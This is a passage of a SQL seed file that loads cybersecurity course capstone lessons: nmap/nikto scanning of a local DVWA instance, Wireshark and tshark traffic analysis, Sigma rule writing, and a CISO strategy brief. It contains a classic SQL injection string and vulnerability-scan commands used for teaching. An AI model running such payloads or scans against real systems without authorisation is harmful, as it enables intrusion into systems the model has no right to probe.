> **Note:** DVWA is intentionally vulnerable. You are scanning your own local system — this is legal and safe.

## Tasks

### Task 1 — Service Discovery (10 marks)

Scan your localhost with nmap to see what is running:

```
nmap -sV localhost
```

Take a screenshot. Identify the web server software and version.

### Task 2 — Nikto Web Scan (20 marks)

Run nikto against DVWA:

```
nikto -h http://localhost
```

Take a screenshot of the output. Nikto will list multiple findings. In your report, pick the **5 most significant findings** and list them in a table:

| # | Finding | Severity (your assessment) |
|---|---------|---------------------------|
| 1 | ... | ... |

### Task 3 — NSE Vulnerability Scripts (15 marks)

Run nmap's vulnerability detection scripts:

```
nmap --script vuln localhost
```

Take a screenshot. Note any vulnerabilities detected by the scripts. Compare with nikto's findings — are there any overlaps?

### Task 4 — Manual Exploration (15 marks)

In Firefox, navigate through DVWA and identify one vulnerability manually:

1. Go to **DVWA → SQL Injection** page.
2. In the User ID field, type: `1' OR '1'='1` and click Submit.
3. Take a screenshot of the result.

In your report, explain:
- What happened (what data was shown that should not be).
- Why this is a vulnerability (what an attacker could do with it).
- How it should be fixed (parameterised queries / input validation).

### Task 5 — CVSS Rating (15 marks)

For each of your 5 findings from Task 2, assign a CVSS v3.1 Base Score using this simplified guide:

| Score Range | Severity | Meaning |
|-------------|----------|---------|
| 0.0 | None | Informational |
| 0.1–3.9 | Low | Limited impact, hard to exploit |
| 4.0–6.9 | Medium | Moderate impact or moderately easy to exploit |
| 7.0–8.9 | High | Significant impact or easy to exploit |
| 9.0–10.0 | Critical | Severe impact and easy to exploit remotely |

For each finding, state the score, severity, and a one-sentence justification.

### Task 6 — Assessment Report (25 marks)

Write a **vulnerability assessment report** as the final section of your PDF:

**1. Executive Summary** (3–4 sentences): What was tested, how, and the overall risk level.

**2. Findings Table:**

| # | Vulnerability | CVSS | Severity | Remediation |
|---|--------------|------|----------|-------------|
| 1 | ... | ... | ... | ... |

**3. Recommendations:** List 3 prioritised actions the system owner should take.

---

## Marking Rubric

| Task | Marks | Criteria |
|------|-------|----------|
| 1. Service discovery | 10 | Correct nmap command; web server identified |
| 2. Nikto scan | 20 | Output shown; 5 findings selected and listed |
| 3. NSE scripts | 15 | Script scan output; comparison with nikto |
| 4. Manual SQL injection | 15 | Successful injection; explanation correct; fix stated |
| 5. CVSS rating | 15 | Scores reasonable; justifications provided |
| 6. Assessment report | 25 | Executive summary; findings table; 3 recommendations |
| **Total** | **100** | |

## Cleanup

When finished, stop DVWA:
```
sudo docker stop dvwa && sudo docker rm dvwa
```

## Submission

1. Compile into PDF.
2. Name: **`BH-CYBER2-capstone-[FirstName]-[LastName].pdf`**
3. Upload using the **Upload Capstone** button below.
$md$, 120, 1);

-- ========== BH-OPS-2: CAPSTONE ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000075', 'Capstone: Incident Investigation Lab',
 'Analyse a packet capture, extract indicators of compromise, and write an incident report.',
$md$
# Capstone: Incident Investigation Lab

## Overview

You will analyse a packet capture file (PCAP) in Wireshark, extract indicators of compromise, reconstruct a timeline, and produce an incident report.

**Time estimate:** 90–120 minutes
**Prerequisite:** Kali Linux with Wireshark.
**Deliverable:** PDF with screenshots and an incident report.

## Setup — Download the PCAP

Download a sample HTTP traffic capture:

```
cd ~/capstone
wget https://wiki.wireshark.org/uploads/27707187aeb30df68e70c8fb9571571/http.cap -O incident.pcap
```

> **Note:** This is a publicly available sample from the Wireshark project. For a more complex exercise, your instructor may provide an alternative PCAP.

## Tasks

### Task 1 — Initial Triage (15 marks)

Open the PCAP in Wireshark:
```
wireshark ~/capstone/incident.pcap
```

Take a screenshot of the main packet list. In your report, record:
- Total number of packets
- Time span of the capture
- How many unique IP addresses are involved (use **Statistics → Endpoints → IPv4**)

### Task 2 — Conversation Analysis (15 marks)

Go to **Statistics → Conversations → TCP tab**.

Take a screenshot. Identify:
- The busiest conversation (most bytes transferred)
- The source and destination IPs
- The ports used

### Task 3 — Protocol Analysis (15 marks)

Go to **Statistics → Protocol Hierarchy**.

Take a screenshot. In your report, answer:
- What percentage of traffic is HTTP?
- Are there any unexpected or suspicious protocols?
- What does the protocol distribution tell you about the nature of the traffic?

### Task 4 — Deep Packet Inspection (20 marks)

Apply display filters to investigate:

1. Filter: `http.request` — Take a screenshot. List all HTTP requests (method + URL).
2. Select an HTTP request → right-click → **Follow → TCP Stream**. Take a screenshot of the stream. Identify any sensitive data visible in plain text.

In your report, explain why seeing data in plain text (HTTP vs HTTPS) is a security concern.

### Task 5 — Extract IOCs (10 marks)

From your analysis, extract the following indicators of compromise and list them in a table:

| IOC Type | Value | Context |
|----------|-------|---------|
| IP address | ... | Source/destination of ... |
| Domain | ... | Resolved from DNS query |
| URL | ... | HTTP request to ... |
| User-Agent | ... | Used in HTTP request |

### Task 6 — Incident Report (25 marks)

Write an incident report as the final section of your PDF:

**1. Incident Summary** (3–4 sentences): What happened, when, and the scope.

**2. Timeline of Events:**

| Time | Source | Destination | Activity |
|------|--------|-------------|----------|
| ... | ... | ... | ... |

**3. Indicators of Compromise:** (from Task 5)

**4. Impact Assessment:** What data was at risk? What is the potential impact?

**5. Recommendations:** 3 actions to prevent recurrence.

---

## Marking Rubric

| Task | Marks | Criteria |
|------|-------|----------|
| 1. Initial triage | 15 | Packet count, time span, endpoints correct |
| 2. Conversations | 15 | Busiest conversation identified with IPs/ports |
| 3. Protocol hierarchy | 15 | Screenshot shown; questions answered correctly |
| 4. Deep inspection | 20 | Filters applied; TCP stream shown; plain text risk explained |
| 5. IOC extraction | 10 | IOC table with at least 4 indicators |
| 6. Incident report | 25 | All sections present; timeline accurate; recommendations valid |
| **Total** | **100** | |

## Submission

1. Compile into PDF.
2. Name: **`BH-OPS2-capstone-[FirstName]-[LastName].pdf`**
3. Upload using the **Upload Capstone** button below.
$md$, 120, 1);

-- ========== BH-SPEC-SOC: CAPSTONE ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000076', 'Capstone: Detection Engineering Lab',
 'Analyse traffic with tshark, write Sigma detection rules, and map to MITRE ATT&CK.',
$md$
# Capstone: Detection Engineering Lab

## Overview

You will use tshark for command-line traffic analysis, write detection rules in Sigma format, and map findings to the MITRE ATT&CK framework.

**Time estimate:** 90–120 minutes
**Prerequisite:** Kali Linux with tshark and Wireshark.
**Deliverable:** PDF with screenshots, Sigma rules, and ATT&CK mapping.

## Setup

Download a sample PCAP and ensure tshark is available:

```
cd ~/capstone
wget https://wiki.wireshark.org/uploads/27707187aeb30df68e70c8fb9571571/http.cap -O detection-lab.pcap
tshark --version
```

> **Note:** Your instructor may provide a more complex PCAP with simulated attack traffic.

## Tasks

### Task 1 — tshark Analysis (20 marks)

Use tshark to extract key information from the PCAP:

```
# List all conversations:
tshark -r detection-lab.pcap -q -z conv,tcp

# Extract HTTP requests:
tshark -r detection-lab.pcap -Y "http.request" -T fields -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri

# Extract DNS queries:
tshark -r detection-lab.pcap -Y "dns.qry.name" -T fields -e ip.src -e dns.qry.name
```

Take a screenshot of each command's output. In your report, summarise what you found.

### Task 2 — Identify Suspicious Patterns (15 marks)

Based on your tshark analysis, identify at least **2 patterns** that a SOC analyst should investigate. Examples:
- Unusual volume of requests to a single host
- Unencrypted data transfer (HTTP instead of HTTPS)
- DNS queries to unusual domains
- Connections to external IPs on non-standard ports

For each pattern, explain why it is suspicious.

### Task 3 — Write Sigma Detection Rules (25 marks)

Write **2 Sigma detection rules** based on your findings. Use this YAML format:

```yaml
title: [Descriptive title]
id: [generate a UUID or use a placeholder]
status: experimental
description: [What this rule detects]
author: [Your name]
date: [Today's date]
logsource:
    category: [proxy/firewall/webserver]
    product: [generic]
detection:
    selection:
        [field]: [value or pattern]
    condition: selection
level: [informational/low/medium/high/critical]
tags:
    - attack.[tactic]
    - attack.t[technique number]
falsepositives:
    - [One likely false positive]
```

Include the full YAML for both rules in your report.

### Task 4 — MITRE ATT&CK Mapping (20 marks)

Map your findings to the MITRE ATT&CK framework. Complete this table:

| Finding | ATT&CK Tactic | ATT&CK Technique | Technique ID |
|---------|---------------|-------------------|--------------|
| ... | ... | ... | T.... |

Reference the ATT&CK matrix at [attack.mitre.org](https://attack.mitre.org/) to find the correct tactic and technique.

### Task 5 — Detection Gap Analysis (20 marks)

Write a one-page **Detection Gap Analysis**:

1. **What we can detect:** List the attacks/behaviours your Sigma rules would catch.
2. **What we cannot detect:** List 2 attack techniques that your rules would miss.
3. **Recommendations:** For each gap, suggest a data source or rule that would close it.

---

## Marking Rubric

| Task | Marks | Criteria |
|------|-------|----------|
| 1. tshark analysis | 20 | All 3 commands run; outputs shown; summary provided |
| 2. Suspicious patterns | 15 | At least 2 patterns identified with valid reasoning |
| 3. Sigma rules | 25 | 2 rules in correct YAML format; detections are logical |
| 4. ATT&CK mapping | 20 | Correct tactics and technique IDs |
| 5. Gap analysis | 20 | Gaps and recommendations are realistic and specific |
| **Total** | **100** | |

## Submission

1. Compile into PDF.
2. Name: **`BH-SPEC-SOC-capstone-[FirstName]-[LastName].pdf`**
3. Upload using the **Upload Capstone** button below.
$md$, 120, 1);

-- ========== BH-ADV: CAPSTONE ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000077', 'Capstone: Security Programme Board Brief',
 'Conduct a maturity assessment, build a risk register, draft a 3-year security strategy, and present a board-ready document.',
$md$
# Capstone: Security Programme Board Brief

## Overview

This is the programme's final capstone. As a future CISO or security leader, you will conduct a maturity assessment of a fictional organisation, build a risk register, draft a 3-year security strategy, and present it in a board-ready document.

This capstone integrates content from across the entire programme: governance, risk management, security architecture, incident management, and programme management.

**Time estimate:** 3–4 hours
**Prerequisites:** Kali Linux (for system evidence gathering); all prior coursework completed.
**Deliverable:** A board-ready Security Programme Brief PDF.

## Scenario

You have been appointed as the new Chief Information Security Officer (CISO) of **Meridian Health Group**, a mid-sized healthcare organisation with 2,000 employees across 5 locations. They process patient health records (PHI under HIPAA / POPIA) and accept credit card payments (PCI DSS).

Current state:
- No formal ISMS or security programme charter.
- Security is handled reactively by the IT team.
- Recent ransomware incident caused 3 days of downtime.
- Board has requested a security improvement plan with budget.
- Basic firewall and antivirus deployed; no SIEM, no EDR, no vulnerability scanning.
- No incident response plan, no DR testing.

## Tasks

### Task 1 — Maturity Assessment (20 marks)

Using the CMMI maturity model, assess the organisation's current maturity level across these domains:

| Domain | Your Assessment (Level 1–5) | Evidence/Justification |
|--------|---------------------------|----------------------|
| Asset Management | | |
| Access Control | | |
| Vulnerability Management | | |
| Incident Response | | |
| Security Monitoring | | |
| Risk Management | | |
| Compliance | | |
| Security Awareness | | |

For each domain, provide a 1–2 sentence justification based on the scenario. Screenshot your completed assessment table.

### Task 2 — Risk Register (20 marks)

Build a risk register with at least 8 risks. Use the following format:

| Risk ID | Risk Description | Likelihood (1-5) | Impact (1-5) | Risk Score | Risk Owner | Treatment | Control |
|---------|-----------------|-------------------|--------------|-----------|------------|-----------|---------|

Include risks from: ransomware, PHI breach, PCI non-compliance, insider threat, phishing, unpatched systems, no DR capability, and one risk of your choice.

Rate likelihood and impact. Calculate risk score (L × I). Specify treatment: Accept, Mitigate, Transfer, or Avoid. Name a specific control for each.

### Task 3 — Evidence Gathering on Kali (15 marks)

On your Kali Linux system, gather system evidence that demonstrates the type of information a CISO would need when assessing an organisation's security posture:

```
# System information
uname -a > ~/capstone/system-info.txt
df -h >> ~/capstone/system-info.txt

# Listening services (attack surface)
ss -tuln > ~/capstone/services.txt

# Firewall rules
sudo iptables -L -n > ~/capstone/firewall-rules.txt

# System hardening audit
sudo lynis audit system --quick > ~/capstone/lynis-report.txt 2>&1
```

Take screenshots of: system info, listening services, firewall rules, and the Lynis hardening index score. Write a 1-paragraph summary of what the evidence tells you about the system's security posture.

### Task 4 — Three-Year Security Strategy (25 marks)

Draft a 3-year security strategy roadmap for Meridian Health Group. Structure it as:

**Year 1 — Foundation (Quick Wins and Critical Gaps):**
- List 5 specific initiatives with estimated budget and priority.
- Must address: incident response plan, vulnerability scanning, security awareness training.

**Year 2 — Build (Programme Maturity):**
- List 4 specific initiatives.
- Must address: SIEM deployment, DR testing, compliance readiness (HIPAA/PCI DSS).

**Year 3 — Optimise (Continuous Improvement):**
- List 3 specific initiatives.
- Must address: programme metrics, maturity reassessment, advanced detection (EDR/SOAR).

For each initiative, specify: description, estimated cost range, responsible role, target maturity level improvement, and alignment to a framework (ISO 27001 control, NIST CSF function, or COBIT objective).

### Task 5 — Board Brief Document (20 marks)

Compile everything into a board-ready document with these sections:

1. **Cover Page:** "Information Security Programme Brief — Meridian Health Group", date, your name as CISO, "CONFIDENTIAL — BOARD OF DIRECTORS".
2. **Executive Summary** (1 page max): Current state assessment, top 3 risks, proposed investment, expected outcome. Written for non-technical board members.
3. **Maturity Assessment Summary:** Visual or table showing current vs target maturity.
4. **Top Risks:** Risk register summary with the 5 highest-scoring risks.
5. **Strategic Roadmap:** Year 1 / Year 2 / Year 3 with initiatives, budget, and timeline.
6. **Investment Request:** Total 3-year budget request with breakdown by year and category (personnel, technology, services).
7. **Framework Alignment:** State which frameworks will be adopted (ISO 27001, NIST CSF, COBIT) and why.
8. **Appendix:** Full risk register, Lynis report screenshots, detailed initiative list.

---

## Marking Rubric

| Section | Marks | Criteria |
|---------|-------|----------|
| Task 1: Maturity Assessment | 20 | All 8 domains assessed; levels justified; realistic for the scenario |
| Task 2: Risk Register | 20 | 8+ risks; L/I/Score calculated; treatments and controls appropriate |
| Task 3: Evidence Gathering | 15 | All 4 commands run; screenshots provided; summary paragraph insightful |
| Task 4: Strategy Roadmap | 25 | 12 initiatives across 3 years; budget estimated; framework aligned |
| Task 5: Board Brief | 20 | Executive summary clear; professional format; investment quantified |
| **Total** | **100** | |

## Submission

1. Compile into PDF.
2. Name: **`BH-ADV-capstone-[FirstName]-[LastName].pdf`**
3. Upload using the **Upload Capstone** button below.
$md$, 180, 1);

-- =====================================================================
-- ========== POPULATE courses.skills FOR "Skills You Will Gain" ==========
-- =====================================================================
UPDATE public.courses SET skills = '["Digital literacy","Operating system basics","Command-line navigation","Basic networking concepts","Cybersecurity awareness"]'::jsonb WHERE code = 'BH-BRIDGE';
UPDATE public.courses SET skills = '["Hardware troubleshooting","Windows OS management","Network fundamentals","Security concepts","Reconnaissance with nmap and dig"]'::jsonb WHERE code = 'BH-FOUND-1';
UPDATE public.courses SET skills = '["Routing and switching","IPv6 and NAT","Network troubleshooting","SNMP and syslog monitoring","Packet analysis with Wireshark"]'::jsonb WHERE code = 'BH-FOUND-2';
UPDATE public.courses SET skills = '["Threat landscape analysis","Security controls and frameworks","Cryptography fundamentals","OWASP Top 10 and application security","Vulnerability scanning with nmap and nikto"]'::jsonb WHERE code = 'BH-CYBER-2';
UPDATE public.courses SET skills = '["SOC operations and monitoring","Log analysis and SIEM correlation","Incident response procedures","Endpoint detection and response","Vulnerability and patch management"]'::jsonb WHERE code = 'BH-OPS-2';
UPDATE public.courses SET skills = '["Advanced threat detection","Windows Event Log and Sysmon analysis","Detection engineering with Sigma rules","Malware triage and sandboxing","Cloud SOC monitoring"]'::jsonb WHERE code = 'BH-SPEC-SOC';
UPDATE public.courses SET skills = '["Security architecture and models","Cryptographic systems and PKI","CISSP domain knowledge","Security programme management","Governance frameworks (COBIT, ISO 27001)"]'::jsonb WHERE code = 'BH-ADV';

COMMIT;
